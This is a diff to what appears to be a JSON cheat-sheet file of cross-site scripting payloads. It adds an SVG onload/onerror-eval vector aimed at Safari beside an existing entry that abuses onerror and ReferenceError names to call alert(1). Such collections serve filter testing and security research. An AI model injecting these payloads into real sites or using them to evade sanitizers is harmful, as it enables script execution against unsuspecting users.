@@ -264,5 +264,10 @@
     "description": "onerror and ReferenceError without throw",
     "code": "<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "SVG onerror and XSS new constructor",
+    "code": "<svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>",
+    "browsers": ["safari"]
   }
 ]
